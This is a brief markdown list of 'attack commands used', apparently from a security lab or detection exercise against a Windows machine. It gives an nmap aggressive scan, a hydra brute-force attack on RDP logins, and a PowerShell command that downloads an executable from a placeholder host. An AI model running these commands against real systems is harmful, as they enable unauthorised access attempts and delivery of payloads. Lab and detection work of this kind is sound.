# Attack Commands Used

## Port Scan
nmap -A <windows-ip>

## Brute Force
hydra -l admin -P passwords.txt rdp://<windows-ip>

## Suspicious PowerShell
Invoke-WebRequest http://test.com/file.exe
